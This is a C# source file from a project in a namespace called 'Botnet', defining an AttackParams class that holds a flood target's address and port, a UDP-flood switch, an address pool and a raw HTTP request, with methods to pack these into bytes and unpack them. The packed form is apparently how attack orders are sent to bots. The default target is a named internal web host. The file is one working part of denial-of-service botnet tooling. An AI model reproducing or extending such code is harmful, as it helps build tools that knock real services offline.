using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Botnet
{
    sealed public class AttackParams
    {
        public IPEndPoint Target;
        public bool UdpFloodEnabled;
        public NetworkInstruments.AddressPool RestrictedPool;
        public string HttpMsg;
        public AttackParams(IPEndPoint Target, string HttpMsg, NetworkInstruments.AddressPool RestrictedPool)
        {
            this.Target = Target;
            this.HttpMsg = HttpMsg;
            UdpFloodEnabled = true;
            this.RestrictedPool = RestrictedPool;
        }
        public AttackParams(IPEndPoint Target, string HttpMsg)
        {
            this.Target = Target;
            this.HttpMsg = HttpMsg;
            UdpFloodEnabled = false;
            this.RestrictedPool = new NetworkInstruments.AddressPool(IPAddress.Any, IPAddress.Any); //make sure they are empty
        }
        public AttackParams()
        {
            try
            {
                Target = new IPEndPoint(Dns.GetHostAddresses("cinema.eastoffice.companyname")[0], 80);
            }
            catch (SocketException)
            {
                Target = new IPEndPoint(IPAddress.Any, 80);
            }
            UdpFloodEnabled = true;
            RestrictedPool = new NetworkInstruments.AddressPool(NetworkInstruments.getLocaIP(), NetworkInstruments.getLocaIP());
            HttpMsg = "GET http://cinema.eastoffice.companyname/index.php/ HTTP/1.1\r\n" +
                "Host: cinema.eastoffice.companyname\r\n" +
                "Connection: keep-alive\r\n" +
                "User-Agent: Mozilla/5.0\r\n" +
                "\r\n";
        }
        public static AttackParams parseFromArray(byte[] ParamsArray)
        {
            AttackParams Params = new AttackParams();
            byte[] Targip = new byte[4];
            byte[] rest1 = new byte[4];
            byte[] rest2 = new byte[4];
            Array.Copy(ParamsArray, 0, Targip, 0, 4);
            Array.Copy(ParamsArray, 7, rest1, 0, 4);
            Array.Copy(ParamsArray, 11, rest2, 0, 4);
            Params.Target = new IPEndPoint(new IPAddress(Targip), BitConverter.ToUInt16(ParamsArray, 4));
            Params.UdpFloodEnabled = Convert.ToBoolean(ParamsArray[6]);
            Params.RestrictedPool = new NetworkInstruments.AddressPool(new IPAddress(new byte[] { rest1[0], rest1[1], rest1[2], rest1[3] }), new IPAddress(new byte[] { rest2[0], rest2[1], rest2[2], rest2[3] }));
            byte[] httpmsg = new byte[ParamsArray.Length - 15];
            Array.Copy(ParamsArray, 15, httpmsg, 0, httpmsg.Length);
            Params.HttpMsg = System.Text.Encoding.ASCII.GetString(httpmsg);
            return Params;
        }
        public byte[] GetBytes()
        {
            //target ip + port + udpmark+ restpool + http msg
            List<byte> res = new List<byte>(15);
            byte[] targetip = Target.Address.GetAddressBytes();
            byte[] port = BitConverter.GetBytes(Convert.ToUInt16(Target.Port));
            byte[] rpool0 = RestrictedPool[0].GetAddressBytes();
            byte[] rpool1 = RestrictedPool[1].GetAddressBytes();
            res.AddRange(targetip);
            res.AddRange(port);
            res.Add(Convert.ToByte(UdpFloodEnabled));
            res.AddRange(rpool0);
            res.AddRange(rpool1);
            res.AddRange(Encoding.ASCII.GetBytes(HttpMsg));
            return res.ToArray();
        }
    }
}
